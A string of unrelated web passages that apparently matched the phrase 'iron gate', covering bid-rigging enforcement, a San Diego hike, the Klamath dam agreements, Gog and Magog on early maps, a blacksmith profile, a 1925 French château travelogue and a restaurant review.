seen in Sit Kam Tai v. Gammon Iron Gate Co., the Housing Authority case.</p>   <p>&#x201c;Anticompetitive practices in public pro&#xad;curement are, and will remain, among the top enforcement priorities of most compe&#xad;tition agencies,&#x201d; says Antonio Capobianco, Senior Expert in Competition Law Enforce&#xad;ment with the Organisation for Economic Co-operation and Development in Paris. &#x201c;Bid-rigging cases are the most common type that we see at the national level.&#x201d;</p>   <p>Hong Kong is far from alone in its pursuit of such anticompetitive behaviour. The Aus&#xad;tralian law firm Minter Ellison, in a recent note to clients, noted that anticompetitive behaviour was a worldwide phenomenon, even in developed economies.</p>   <p>Last year, nine Japanese companies paid US$740 million in fines for a price-fixing conspiracy targeting U.S. car manufacturers such as General Motors and Ford Motor.</p>   <p>This year, the European Commission fined 17 producers of pre-stressed steel a total of &#x20ac;269 million for operating a cartel lasting 18 years.</p>   <p>In 2011, three Australian pre-mixed con&#xad;crete suppliers were fined A$20 million for engaging in price-fixing and market-sharing cartels. Authorities imposed A$1.3 million in fines &#x2013; the maximum possible &#x2013; on con&#xad;struction companies tendering for govern&#xad;ment contracts for bid rigging.</p>   <p>In the United Kingdom, the Office of Fair Trading imposed fines of &#xa3;129.2 million on 103 construction firms for collusive tender&#xad;ing for government contracts in 2009.</p>   <p>Hong Kong&#x2019;s Competition Commission is likely to pay close attention as global trends in competition enforcement could influence policy at the fledgling authority. &#x201c;The Competition Commission [might] look to build relationships with competition authorities in jurisdictions that have more established competition regimes,&#x201d; says Ninette Dodoo, Counsel at the Freshfields Bruckhaus Deringer law firm in Hong Kong.</p>   <p>These exchanges could in turn influence the types of cases the commission might bring,&#x201d; she adds. Noting ongoing investiga&#xad;tions in China, Dodoo suggests the commis&#xad;sion might initially target vertical arrange&#xad;ments (distribution or franchising deals that operate &#x2018;vertically&#x2019; through a supply chain) that result in artificially high prices. &#x201c;Like re&#xad;sale price maintenance, where distributors agree with a manufacturer to sell a certain product at a certain price.&#x201d;[/stextbox]</p>   <footer>    <p> Categories: , | Tags: , , , , | </p>   </footer>    <div>    <div>     <h3>Author: </h3>     <p>GAA Accounting is the journal of the Global Accounting Alliance.</p>    </div>    </div>   </div>

   <div>   <p>Iron Mountain is one of the more popular hikes in San Diego County, maybe second only to Cowles Mountain. The trail head is easily accessible, located right off Highway 67 in Poway, offers a reasonably challenging trek for the average person, and on a clear day has some amazing views of northeast San Diego County. Thus it is a &#xa0;common destination for San Diegans looking for a quick outdoor workout.</p>   <p>This is not the trail for quiet solitude, but its still a worthwhile excursion. Be warned that the trail is very exposed and can get incredibly hot during the summer months. Between the heat and the popularity of this spot, its a good idea to plan for an early start. The parking lot tends to fill up on weekends, so aim to beat the crowds and the midday heat by getting there by 8 am or earlier. I&#x2019;m also told this makes a pleasant evening hike if that&#x2019;s your thing (just bring a headlamp in case you&#x2019;re out past dark!).</p>   <p>We made the trek on an early Sunday morning. The morning marine layer kept us nice and cool for the climb up to the peak.</p>   <p>From the main parking lot, we passed through the ornate wooden gate and followed the path. The trail wound back towards the highway then passed through a tunnel of oak trees.</p>   <p>Upon exiting this initial stretch of trees, the trail was wide and exposed, surrounded on either side by chaparral and brown grassland. The peak lay before us to the right, but was shrouded in fog like the rest of the surrounding hills.</p>   <p>At .4 mile we came to an intersection. To the left was a trail to the Ellie Lane staging area &#x2013; an alternative starting point for the hike. To continue to Iron Mountain, we had a choice of continuing straight along the main trail, or taking the side branch to the right. Both routes are roughly equal in length and difficulty, however the side trail is somewhat less travelled. We headed right.</p>   <p>Before long, the trail began to climb gradually, threading its way through tall brush on either side.</p>   <p>At 1 mile we encountered another intersection where we merged with the main trail. A left turn here would lead back to the staging area, so we continued on straight.</p>   <p>A little ways up the trail we found an open spot to enjoy the the view behind us.</p>   <p>We hit a number of pretty steep and rocky sections as we progressed, balanced out by more level stretches in between.</p>   <p>We finally caught a glimpse of one of the blue jays that we could hear squawking in the bushes all around us, but he didn&#x2019;t stay still long enough to get a good picture. At 1.5 miles, halfway to the top, we reached another junction point. Heading left will take you to the Ramona Overlook, and a longer path back to the Ellie Lane Staging Area. We headed right to continue on to the peak.</p>   <p>We continued climbing the dusty trail, our destination still shrouded in fog. For the most part, the brush around us was lower growing than we&#x2019;d seen on the earlier portions of the trail, and we found increasing amounts of beautiful red rocks poking through the brush.</p>   <p>Around 1.67 miles we found the turn off for the trail leading to the helipad. We didn&#x2019;t bother with this detour and stayed on the main trail.</p>   <p>The trail leveled out for a bit as we wound around the edge of the mountain. As we went on the smell of sage was thick in the air. Large rock formations on the trail side caught our eye.</p>   <p>Around 2.25 miles we noticed a small side trail branching off to the right, but we continued along the main trail. Around .1 mile later we found the other end of this side trail, which is simply another alternative route. We ended up taking this route on the way back, and found it offered a slightly more scenic and quieter journey than the main trail.</p>   <p>Around 2.4 miles we came to the base of the switchbacks leading up the final stretch. The fog was finally burning off and we could see hikers zigzagging up the trail leading to the top of&#xa0;the mountain.</p>   <p>The switchbacks were somewhat steep and rocky in spots, but nothing terrible.</p>   <p>The marine layer was slowly evaporating from the surrounding mountain tops, and we began to pick out landmarks as we climbed. To the north, the antenna topped peak of Mount Woodson began to emerge.</p>   <p>Due east was the towering ridge of the Cuyamacas poking up above the clouds.</p>   <p>To the west was the city of Poway, and Black Mountain beyond.</p>   <p>We finally made it to the top, where we found the peak register safely stowed in a mailbox, picnic tables, a telescope and more lovely boulders on which we sat, ate our snacks, and enjoyed the views.</p>   <p>In addition to all the other landmarks we had identified as we climbed, we could now see the San Vicente Reservoir to the south.</p>   <p>After exploring the summit, we headed back down.</p>   <p>View the </p>   <p><strong>Directions:</strong> From I-15, take the Scripps Poway Pkwy exit. Head east on Scripps Poway Parkway for approximately 8.5 miles to Highway 67. Turn left (north) on Highway 67, the parking area will be on your right approximately 1.7 miles up Highway 67, right before the intersection with Poway Road. </p>   <table>    <tbody>     <tr>      <td>Total Distance:</td>      <td>6 miles</td>     </tr>     <tr>      <td>Difficulty:</td>      <td>Moderate</td>     </tr>     <tr>      <td>Total Ascent:</td>      <td>1530&#xa0;feet</td>     </tr>     <tr>      <td>Dog Friendly?:</td>      <td>Leashed dogs allowed</td>     </tr>     <tr>      <td>Bike Friendly?:</td>      <td>Bikes Allowed</td>     </tr>     <tr>      <td>Facilities:</td>      <td>Pit toilets in parking lot, no water</td>     </tr>     <tr>      <td>Fees/Permits:</td>      <td>None</td>     </tr>    </tbody>   </table>   <p>For more information, visit: City of Poway &#x2013; View </p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3>Related Posts</h3>    <ul>     <li>      <div>       <p>The Lake Hodges area in Escondido is a popular destination for mountain bikers and hikers looking for a a good trek not too far from home.

   <div>   <p><strong>Klamath Basin Agreements</strong></p>   <p>More than 50 organizations, including Federal agencies, California and Oregon, Indian tribes, counties, irrigators and conservation and fishing groups have agreed to a comprehensive solution for the water, fisheries, and power issues in the Klamath Basin.</p>   <p>The Klamath Basin Restoration Agreement (KBRA) was intended to result in effective and durable solutions which will: 1) restore and sustain natural fish production and provide for full participation in ocean and river harvest opportunities of fish species throughout the Klamath Basin; 2) establish reliable water and power supplies which sustain agricultural uses, communities, and National Wildlife Refuges; and 3) contribute to the public welfare and the sustainability of all Klamath Basin communities.</p>   <p>The Klamath Hydroelectric Settlement Agreement (KHSA) lays out the process for additional studies, environmental review, and a decision by the Secretary of the Interior regarding whether removal of four dams owned by PacifiCorp: 1) will advance restoration of the salmonid fisheries of the Klamath Basin; and 2) is in the public interest, which includes but is not limited to consideration of potential impacts on affected local communities and tribes. The four dams are Iron Gate, J.C. Boyle, Copco 1 and Copco 2 dams on the Klamath River. The Hydroelectric Settlement includes provisions for the interim operation of the dams and the process to transfer, decommission, and remove the dams.</p>   <p>The Upper Klamath Basin Comprehensive Agreement (UKBCA) addresses water and fishery issues in the area above Upper Klamath Lake.</p>   <p>The KBRA terminated on December 31, 2015 because the federal authorizing legislation was not enacted.</p>   <p>The KHSA and UKBCA&#xa0; are still in effect; they did not terminate with the KBRA. These agreements also require federal authorization legislation and their implementation is interdependent with the now-terminated KBRA. The KHSA and UKBCA provide processes for amendment or termination. Any amendments or other formal actions will be posted on this website.</p>   <p>The parties to the Klamath Basin Agreements will be consulting to determine the next steps they will take.</p>   <p>Ed Sheets is the facilitator for the agreements.

   <div>   <small>Thursday, April 1st, 2010</small>   <div>    <div>     <p>Gog and Magog in Sanson's 1691 Map of the World</p>    </div>The appearance of the lands of Gog and Magog in many early maps is one the most interesting and enduring examples of Biblical lore being translated into the cartographic medium. The kingdoms of Gog and Magog appear in many early maps of Asia and the World produced between about 1200 to 1750. Generally these kingdoms are situated somewhere west of the Caspian Sea and, more frequently, to the north of China around Mongolia or Siberia. How did they get there?    <p>The tale of Gog and Magog is, of course, Biblical in origins with elements in Jewish, Christian and Islamic traditions. They appear in Genesis and Ezekiel as cursed grandchildren of Noah and are set up early on as enemies of the righteous. The most alarming mention of Gog and Magog appears in Revelation 20:7-8: </p>    <p><em>&#x2026; And when the thousand years are finished, Satan shall be loosed from his prison, and shall go out to seduce the nations which are in the four corners of the earth, Gog and Magog, and shall draw them to battle, whose number is as the sand of the sea&#x2026;</em> </p>    <p>But who exactly where Gog and Magog and where did this terrifying empire have its lands? The Biblical location &#x201c;the four corners of the earth&#x201d;, is not exceptionally helpful save that it puts these nations at the extreme edge of existence. The Jewish historian Josephus associates Magog with the Scythians. In antiquity Scythia was an empire to the north of Parthia or Persia that included much of central Asia as far east as India and Tibet. </p>    <div>     <p>The Building of Alexander's <b>Gates</b> from an early Arabic manuscript.</p>    </div>The Alexander Romance, a c. 300 CE compendium of stories and myths associated with Alexander the Great, brings Gog and Magog into a historical context. Apparently when Alexander marched his army into the Caucuses he discovered a people beset and harassed by the empires of Gog and Magog to the north. Alexander responded to this threat by constructing an enormous wall of adamantine between two mountains known as the &#x201c;Breasts of the World&#x201d;. Today this is commonly associated with the Caspian    <b>Gates</b> of Derbent. This mighty wall, reminiscent of the Great Wall of China, stretches some forty kilometers between the Caspian Sea and the nearby mountains, effectively blocking passage through the Caucuses. Though Alexander had nothing to do with this wall, it was actually constructed by the Sassanid Persians to defend against Gokturk invasions, it does once again place the lands of Gog and Magog somewhere to the north and west of the Caucuses.    <p>Pliney too locates Gog and Magog behind a great set of <b>gates</b> in the Caucuses, describing a place where the mountains have been torn asunder and &#x201c;<b>gates</b> have been placed, with <b>iron</b> covered beams, under the center of which flows a river emitting a horrible odor with ; and on this side of it on a rock stands the fortress called Cumania, erected for the purpose of barring the passage of the innumerable tribes.&#x201d; </p>    <p>The Qur&#x2019;an next takes up this story and adds its own more mythical element. The great hero Dhul Qarnayan (literally &#x201c;two-horned one&#x201d;, a reference to the ram horns Alexander wears on coins minted during his rule to indicate his descent from the Egyptian god Amun) is said to have walled the infernal armies of Gog and Magog behind a great gate where they will remain &#x2013; until doomsday. At this point, </p>    <p><em>when Gog and Magog are let loose and they rush headlong down every height (or advantage). Then will the True Promise draw near.</em> (Qur&#x2019;an 21:96-97). </p>    <div>     <p>Al-Idrisi's World Map with Gog and Magog behind the wall and circled in red. Note, this map is oriented to the south so here Gog and Magog are in the proximity of China.</p>    </div>In the 9th century the Caliph Al-Wathik-Billa actually sent out an expedition, under one Sallam the Interpreter, to discover the    <b>Gates</b> of Alexander. Sallam is said to have searched the Caucuses high and low without success before heading deeper into Asia where he discovered the mighty wall. Sallam&#x2019;s report influenced a number of important Islamic geographies, most importantly for this story, the 12th century geographer Muhammed al-Idrisi, who was employed by the Sicilian monarch Roger II. Idrisi directly associates Alexander&#x2019;s    <b>Gates</b>, and consequently Gog and Magog, with the Great Wall of China. Idrisi&#x2019;s work includes some of the most sophisticated and advanced cartographic work of pre-modern Europe and profoundly influenced European cartography for the next several hundred years. Though not widely distributed in his lifetime, nor solely responsible for the presence of Gog and Magog in later European maps, the influence of Idrisi&#x2019;s map and geographical notations cannot be ignored in any consideration of how these Biblical kingdoms/figures entered the mainstream of later European cartography.    <p>In the rest of Europe, tales of Gog and Magog and the horrors associated with them were a constant element in mediaeval religious rhetoric, which preached of an imminent &#x201c;end of days&#x201d;. Saint Augustine in his 15th century religious classic &#x201c;City of God&#x201d; discourses at length on the duo suggesting that when &#x201c;final judgment is imminent . . . the whole city of Christ being assailed by the whole city of the Devil, as each exists on earth . . . which he names Gog and Magog&#x201d;. Augustine did not associate Gog and Magog with an actual place, but rather with an evil that existed all around us. Even so, this concept must have been too abstract for the medieval man who continued to look for the lands of Gog and Magog. History was about to oblige. </p>    <p>In 1241 CE the hoards of Ghengis Khan swept out of Asia destroying and conquering everything in their path. The brutal, efficient, and alien Mongols must surely have seemed to be the wrath of god unleashed &#x2013; the prophesied end of days had come and with it, Gog and Magog. One Russian chronicler says: &#x201c;In those times there came upon us for our sins unknown nations. No one could tell their origin, whence they came, what religion they professed. God alone knows who they were, God, and, perhaps, wise men learned in books.&#x201d; The period of the Mongol invasions lasted roughly from 1241 to 1285 CE. Nonetheless, after devastating the Chinese Empire, sacking Baghdad, laying waste to Russia, and storming into Croatia, Hungary, Lithuania, and Poland, the invincible hoard simply vanished &#x2026; or so it must have seemed in Europe. In fact, beset with internal political turmoil and the death of the Great Khan, the hoards retreated to Central Asia in order to reorganize. At this time Europe, who had yet to rediscover Ptolemy and truly develop a modern cartographic tradition, wasn&#x2019;t actively making maps, but when it did, a place of origin Tartars or Mongols (Gog and Magog) would have to be identified. </p>    <div>     <p>1697 Rossi Map of Asia - Magog appears north of China.</p>    </div>Marco Polo, in his Travels, is possibly the first European literary figure to identify Gog and Magog with the Tartars. Polo, claimed to have lived in China from 1271 to 1298, where he became an important functionary in the court of Kublai Khan. Polo worked for years as an emissary of the Great Khan and traveled extensively throughout the vast empire. Much of the information about Asia appearing on early maps of the continent, including the Vinland Map and the Waldseemuler Map, can be directly linked to Polo&#x2019;s narratives. Polo associates Gog and Magog with the lands of Tenduk, a province to the north of China ruled by Prester John. In Polo&#x2019;s narrative Gog is translated as Ung and Magog is the home of the Tartars. Ibn Battuta, the great 14th century Moroccan traveler, referring to the tale of Dhul Qarnayan, supports Polo by himself connecting the Great Wall of China with the    <b>gates</b> setup to restrain Gog and Magog, &#x201c;Between it [the city] and the rampart of Yajuj and Majuj is sixty days&#x2019; travel.&#x201d;    <div>     <p>Zoom of Magog in Rossi's 1697 Map of Asia.</p>    </div>Though many dispute the validity of Polo&#x2019;s journals, his impact on the European conception of the world was profound. With the rediscovery of Ptolemy&#x2019;s Geography by Italian humanists and the development of a sophisticated European cartographic tradition the need for more advanced and updated Ptolemaic maps emerged. Many of these maps referenced Polo and al-Idrisi in adding Gog and Magog in the unknown lands of east Asia, thus influencing the cartographic representation of this area for centuries to come.    <p>Today Gog and Magog are considered by many scholars to be a Jungian representation of &#x201c;the other&#x201d;, &#x201c;the frontier&#x201d;, or both. </p>    <p><strong>References: (partially researched by Lindsay McMullen)</strong> <small>Augustine, Saint, The City of God, (Translated by Marcus Dods), page 658.

   <div>   <div>    <p>photography by ADAM EWING</p>   </div>   <p>HUNTLY, VIRGINIA<strong> &#x2013;</strong>&#xa0;Nol Putnam forges wind from <b>iron</b>, his hammer&#xa0;metronomic at 2&#xbd; strikes a second, steel against <b>iron</b> against anvil. The angle of the peen and the force of his follow-through shape hot metal the way a rolling pin pushes pastry.</p>   <p>Putnam, 80, has been creating art from <b>iron</b> for more than 40 years. His hands are strong, his shoulders broad, his hearing damaged by the clang and the clatter. Flying sparks have burned constellations into his beret and shards of metal have scarred his skin, yet he awakens each day excited to return to his fire.</p>   <p>Hot like this, the crystalline molecules of the metal slide past one another and re-form under Putnam&#x2019;s tools as delicate petals and leaves, or as soaring swoops and swirls that cantilever out over broad bases. In the sculpture garden outside his White Oak Forge in Huntly, Virginia, 90 minutes north of Charlottesville on rollercoaster roads, the 7-foot-tall&#xa0;<em>West Three Wind</em>&#xa0;circles back on itself three times before shooting back through all three layers and off toward the distant sky. It is part of his series&#xa0;<em>Lines In Space,</em>&#xa0;some of the sculptures man-sized and some small enough to sit on a table, and all inspired by the childhood books by Thornton Burgess, whose Old Mother West Wind is depicted as lines that eddy off toward the horizon.</p>   <p>&#x201c;When you&#x2019;re doing something like that you have to worry about not just the physical engineering of how it&#x2019;s going to stand up and who&#x2019;s going to come play on it,&#x201d; Putnam says, &#x201c;but then how is that negative space or the space you&#x2019;ve defined going to look to the eye?&#x201d;</p>   <p>The sculpture weighs about 400 pounds, yet Putnam made it alone, heating the metal in his 3,000-degree forge, drawing the curves in chalk on the primitive platen table and bending the metal to meet them, then pounding it with both a mechanical air hammer and his own strength and persistence. For weeks he shaped component parts, then lay each out on blocks on his smithy floor, sometimes using a crane to manipulate them into position, sometimes welding them to the bucket of his tractor in order to keep them in place.</p>   <p><strong>Today he is working with</strong>&#xa0;pure <b>iron</b> imported from England &#x2013; &#x201c;like forging butter, relatively,&#x201d; he says, using tongs to hold a finger-width rod into the fire. Pure <b>iron</b> has a fibrous grain like that of wood, which makes it easy to stretch and bend and shape. Add a little carbon into the latticework of the <b>iron</b> and you create steel, a material much stronger but also more rigid, and thus harder to transform into items of delicate beauty.</p>   <p>Putnam turns a rheostat that controls a fan that blows air through the hot coals, the bellows long gone. He pushes the green coal to the edges of the fire with a toothless rake and pulls more coke toward the center. The rake was the first tool he ever made, and he uses it every day, all day, its handle smooth in his calloused palm. On the side of the forge are a pair of tongs he made himself, and a pair given to him by his mentor. There&#x2019;s a center punch, too, salvaged from the smithy of his best friend when he died half a decade back.</p>   <p>The <b>iron</b> glows red, itself nearing 2,200 degrees, and Putnam carries it to the anvil and begins his rhythmic pounding, each strike precise.</p>   <p>&#x201c;People come in and say, &#x2018;Oh, you&#x2019;re such an artist,&#x2019; which is very flattering,&#x201d; he says, &#x201c;but what they don&#x2019;t understand is that it&#x2019;s about 90 percent practice and only 10 percent genius. In any profession you develop the skill by practice, and that&#x2019;s what most people don&#x2019;t do.&#x201d;</p>   <p>Indeed, his former mentor would give beginners a two-by-four with an X drawn on one end, and only when they could hit the X each time with the center of their hammer were they allowed to work with <b>iron</b>.</p>   <p>Putnam strikes the end of the rod 43 times to bring it to a point, then&#xa0;returns it to the fire.</p>   <p>Both the building and the fire that is the heart of the building are called forges, although the building can also be called a smithy. This is Putnam&#x2019;s&#xa0;seventh, the design winnowed by him from what worked in the ones that came before. There are skylights over the anvil for natural light, and broad windows that frame birds and trees and the pond that separates his workshop from his home. The chimney rises 22 feet &#x2013; the higher the chimney, the better the draw; the better the draw, the hotter the fire. The Venturi effect pulls ash and smoke up the chimney and out of the shop. The floor is 4-inch-thick reinforced&#xa0;concrete; his pneumatic hammer sits on a massive block of wood that rests on its own 4-foot cube of concrete, set deeper than the building&#x2019;s footers so that the vibration of the machine won&#x2019;t set up a resonance that will crack the floors and 12-foot-tall walls.</p>   <p>The beam-mounted crane is 2 feet higher still, giving Putnam room to manipulate long lengths of <b>iron</b> without bashing lights or banging the&#xa0;ceiling. Hundreds of hammers hang next to the forge, the handles of his favorites smooth from use. Nearby are racks of U-shaped forms, some narrow, some wide, designed sometime along the 3,000-year history of man&#x2019;s manipulation of metal. The bottom half of the form is designed to fit into a slot in the anvil; the upper form has a hole for a handle like a hammer&#x2019;s. In a two-person shop the upper form is held by the blacksmith while an apprentice strikes it from above, squeezing and shaping the hot metal inch by inch. In Putnam&#x2019;s shop the striking is done by his pneumatic hammer &#x2013; his mechanical apprentice &#x2013; a machine so brutish it can crush metal, yet with Putnam&#x2019;s trained toes on the air pressure level is gentle enough to close a matchbox without crushing a corner.</p>   <p>Putnam pulls the red metal again from the fire and aligns it under the head of the massive air hammer. Pound after pound it flattens the metal into a lozenge, a flat lollipop on its way to becoming a leaf, its color fading from orange to gray.</p>   <p>&#x201c;This is where it&#x2019;s dangerous,&#x201d; he says, holding the back of his hand over the piece to confirm. The color is gone but the temperature still hovers at about 1,000 degrees. He sticks the metal back into the fire.</p>   <div>    <p>photography by ADAM EWING</p>   </div>   <p>Nol Putnam grew up on a farm,&#xa0;working with his hands. He adored three-dimensional geometry, and lived a life rich with books and&#xa0;music. He became a teacher of&#xa0;history and the creator of cultural bridges between incoming Native American students and the faculty of a western Massachusetts boarding school. He was in his late 30s when he read a library book on blacksmithing and used it and his dad&#x2019;s hammer &#x2013; plus a lot of self-described stubbornness &#x2013; to begin his new career. In his first decade he paid his dues making hooks and andirons and fireplace tools, then standing in heat and rain and cold at craft fairs, peddling his wares.</p>   <p>In the next decade he turned his tools to architectural and structural work &#x2013; balconies and railings and ornate <b>iron</b> <b>gates</b> of steel and copper and brass. The ideas come to him in dreams, fully formed; his job then is to awaken and capture them onto bedside paper and then to translate those sketches into something clients can understand.</p>   <p>For the Rockefeller family he forged brass into a 16-foot-wide gate adorned with a delicate tree. For what he called his &#x201c;Rousseau Gate&#x201d; he created nine leaves, 3 and 5 and 8 feet tall. For each commission he visits the site, talks with the clients about their vision, then returns later with two sketches. He could make more, but the conversations would then be complicated.</p>   <p>&#x201c;I encourage clients to mark up the drawings, to say yea and nay, to tell me what they like and don&#x2019;t,&#x201d; he says. &#x201c;I don&#x2019;t like commission work to simply be an exchange of money. I prefer for the clients to be part of the process, even to the point of coming down and taking a ceremonial whack just to see what it&#x2019;s like. Then the whole piece becomes more meaningful for everybody.&#x201d;</p>   <p>Now he pulls the flat leaf from the fire and draws a mental line down its center, then hammers on one side of it and then the other.</p>   <p>&#x201c;See the line down the middle?&#x201d; he says. &#x201c;Now I&#x2019;m going to put some veins it and then whiffle it so it look like it has some life.&#x201d;</p>   <p>He returns it to the fire.</p>   <p>Putnam forged 250 petals and leaves&#xa0;of a much heavier <b>iron</b> for a pair of <b>gates</b> that hang in the National Cathedral in Washington. The ornate Folger Gate, installed in 1995, frames the entryway to the columbarium in the Chapel of St. Joseph of Arimathea. Nearby hangs Putnam&#x2019;s Brown Gate, and behind that the ashes of ambassadors and bishops, architects and musicians, but also those of Helen Keller and her caregiver, Annie Sullivan.</p>   <p>&#x201c;It&#x2019;s a beautiful building, but it&#x2019;s a little overwhelming to think about being there,&#x201d; he says.</p>   <p>He got the job through word of mouth, and&#xa0;began work with nothing more than a handshake. For the next year and a half he worked &#x2013; 1,200 hours of forming flowers and forging the frame. The pistil on each flower and the rivets that connect the crosspieces are all different; one depicts the face of Yoda from&#xa0;<em>Star Wars</em>.</p>   <p>The <b>gates</b> had to meet specifications for how they hung in the arched entryway, and they had to open and close, and latch smoothly. Beyond those parameters Putnam was free to design to his own vision.</p>   <p>&#x201c;I was just really fortunate &#x2013; that I was given the chance and that I could rise to the occasion,&#x201d; he says. &#x201c;Fortunately, I think it&#x2019;s some of the best work I ever did.&#x201d; The <b>gates</b> are considered to be part of the fabric of the building, the things that give life to the structure: the stone carvings, the windows, the tapestries, the ironwork &#x2013; everything that gives it texture.</p>   <p>He was hired by Canon Richard T. Feller, the longtime and well-known Clerk of the Works &#x2013; chief administrator in charge of all construction and artwork for the cathedral, the sixth-largest in the world.</p>   <p>&#x201c;He was a serious man who took his work very seriously and demanded that everybody else do the same,&#x201d; Putnam says. &#x201c;It made him sometimes difficult to work with. I didn&#x2019;t particularly have a problem with it, but he held your nose to the grindstone in order to get your best work, and it was a valuable lesson.&#x201d;</p>   <p>In the midst of that work, another office of the cathedral called. Former President Gerald Ford was ill, and if he died he would come to the cathedral to lie in state, yet all the cathedral owned were four &#x201c;tacky, wobbly wooden candlesticks,&#x201d; Putnam says. &#x201c;They called me up, desperate, and said, &#x2018;Please please, we need this immediately!&#x2019; &#x201d;</p>   <p>There are few emergencies in artisanal blacksmithing, nor can things easily be rushed. Luckily, President Ford did not die at that time, but the candlesticks, tall and simple and reflective of some of the patterns in the stonework, still stand sentinel.</p>   <p><strong>Putnam pulls the leaf from the fire</strong>&#xa0;and holds it on the forward-pointing cone of the anvil. He taps the metal with his hammer, twisting the leaf until it looks blown by the wind. Then he positions a chisel-like hardy upright in the tool slot of the anvil, lays the leaf&#x2019;s stem across the hardy&#x2019;s edge and takes four solid whacks, slicing nearly through the stem. It is poor form, he says, to cut all the way through and send the hot metal shooting across the shop. Years ago a piece broke loose and whacked him on the head and knocked him out cold.</p>   <p>He clamps the leaf to a workbench and uses a screaming electric grinder to blunt the sharp edge, then holds the leaf and a stamp of his initials under the head of a foot-powered hammer &#x2013; a tool invented in Michelangelo&#x2019;s day &#x2013; and stomps, impressing his initials into the stem, then buffs the leaf with a spinning wheel of wire bristles. Last, he paints it with his homemade elixir of turpentine, linseed oil and beeswax, and buffs it dry.</p>   <p>&#x201c;Now imagine doing all those steps to every component of the cathedral gate,&#x201d; he says, as he holds up the completed leaf.</p>   <p>&#x201c;Patience is a virtue,&#x201d; he says, his voice as&#xa0;cadenced as his hammer, &#x201c;seldom in a woman &#x2026; never in a man &#x2026; but always in a blacksmith.&#x201d;</p>   <p><em>inally published in&#xa0;,&#xa0;May 10, 2014</em></p>  </div>

He's managed to loosen some of the bricks and I can't get him to pay &#x2013; I can't prove he did it!</p>        <p>I've asked him to stop, but he still insists on doing it. Is it ok of me to stick wrought <b>iron</b> fencing on top of the wall (yes, it is my wall, not the neighbour's)? Maybe with some spikes so he can't possibly jump it..? Simsterboy: I tried that. They were of the same position as him &#x2013; I can't prove that it is he who is doing the damage. </p>        <div>         Posted by Devolution        </div>       </div>      </div>      <div>       <div>        <strong>amer icus</strong>        <p>Yes you can put up wrought <b>iron</b> fencing on top of your wall.

   <div>   <div>    <p>Ursula on the Grand Front Terrace at Ch&#xe2;teau Cabri&#xe8;res, France (Photo published in &#x201c;Themis&#x201d; of Zeta Tau Alpha)</p>   </div>   <p>Last week, I posted&#xa0;&#xa0;of Ursula&#x2019;s European adventure&#x2014;written by Ursula, herself! Here&#x2019;s part two, a richly detailed account of studying and living at famous opera singer Emma&#xa0;Calv&#xe9;&#x2019;s castle in southern France. Ursula&#x2019;s travelogue was originally published in her&#xa0;sorority&#x2019;s quarterly journal,&#xa0;<i>Themis</i>&#xa0;of Zeta Tau Alpha, in March 1925.</p>   <p>[Part two] <strong>Studying and Traveling Abroad</strong> By Ursula Claire Cheshire</p>   <p>&#x201c;Ch&#xe2;teau de Cabri&#xe8;res, the home of Mme. Calv&#xe9;, is in the southern part of France, on one of the highest peaks of the Cevene mountains, miles away from any real city. The castle is old Roman style with large round towers, and dates back to the year 1050 A.D. Huge <b>iron</b> <b>gates</b> are at the entrance of the grounds, which are surrounded by thick stone walls, while at the entrance of the ch&#xe2;teau there are two ancient <b>iron</b> bolted doors, one leading into an open court and the other into the hallway.</p>   <div>    <p>Ch&#xe2;teau Cabri&#xe8;res</p>   </div>   <p>The rooms of the ch&#xe2;teau are all exquisitely furnished with things from all parts of the globe. Three rooms appealed to me particularly. First the ancient guard room (now used for the dining room) with its original stone floor, ceiling and fireplace; next the salon with its large carved furniture, and then the Louis XIV bedroom with its heavily handcarved Louis XIV bed.</p>   <p>The castle was an ideal place to study. There was nothing near to bother us. There was nothing near to hear us. We could sing to the many mountain peaks on all sides, with only the sheep on the hillside, or the oxen in the valley, to hear the echoes of our voices.</p>   <div>    <p>French naturalist Jean Henri Fabre</p>   </div>   <p>Yet sometimes this tranquility was broken, for we had guests from near and far&#x2014;musicians, artists and even reporters. When from our heights we would see an auto turn off the main highway below and start to climb the mountain road, that was our signal to prepare for company. Also at different times we would give concerts in the near-by towns, which necessitated short trips, and again our studies would be put aside for a while. One very interesting program was given at Rodez, the capitol of the department of Aveyron, to raise funds for a monument to the great French naturalist, Henri Fabre.</p>   <p>I will never forget my first soir&#xe9;e at the ch&#xe2;teau. Guests came from all around to give us a f&#xea;te, bringing with them pastries, bonbons, wine and champagne, and a grand feast was spread. The evening was spent in dancing and singing and I had a rather interesting time trying to converse with our guests with my then small French vocabulary.&#x201d;</p>   <p><em>To be continued&#x2026;</em></p>   <p><em>&#xa0;</em></p>  </div>

   <div>   <p><b>February 28, 2014</b></p>   <p>Recently re-opened, the <b>Iron</b> Gate has two seating options.&#xa0;&#xa0;First come, first serve at the somewhat covered carriage house which houses a bar and a handful of tables, or tasting menu in the dining room.&#xa0;Unable to get a convenient reservation (and dying to try it out), we settled for the carriage house.</p>   <p>So, how does a restaurant that is effectively outside manage to be &#x201c;completely committed&#x201d; with an hour wait when it is below freezing?</p>   <p>Even though the temperature outside was ghastly frigid, <b>Iron</b> Gate radiated warmth (not insignificantly due to the generous use of heating elements), comfort, and sophistication.&#xa0;&#xa0;We waited for a table while enjoying the ambience of the lovely bar and the delightful cocktails.&#xa0;&#xa0;If it were just the two of us, we probably would have chosen to eat there.</p>   <p>(By the way, for long-married couples, a great way to avoid inane conversation is sitting at the bar, while the barkeep pretends to be your friend in order to extract a large tip at the end of the evening. Otherwise, table discussion often devolves to &#x2013; &#x201c;K: I have to do laundry tomorrow.&#xa0;&#xa0;J: I did it already.&#xa0;&#xa0;K: Did you fold it?&#xa0;&#xa0;J: No.&#xa0;&#xa0;K: Did you do the towels?&#xa0;&#xa0;J: I forgot.&#xa0;&#xa0;I haven&#x2019;t used mine in a few days.&#xa0;&#xa0;K:&#xa0;&#xa0;Wow.&#xa0;That&#x2019;s a great way to start date night.&#xa0;&#xa0;And I have to do laundry tomorrow.&#x201d;&#xa0;&#xa0;Large tip very worthwhile.)</p>   <p>We digress.&#xa0;&#xa0;Onwards to dinner, where we were provided with blankets for added warmth.&#xa0;&#xa0;(K: Loved it.&#xa0;&#xa0;J: Be aware of other people&#x2019;s blankets.&#xa0;&#xa0;That&#x2019;s how the Europeans spread small-pox to Native Americans.&#xa0;&#xa0;K: Said from a person that hadn&#x2019;t showered &#x201c;in a few days.&#x201d;)</p>   <p>Wine, a 2006 barolo per the recommendation of the manager, was probably one of the best bottles we&#x2019;ve had in some time.</p>   <p>Our dinner order was literally &#x201c;everything vegetarian on the 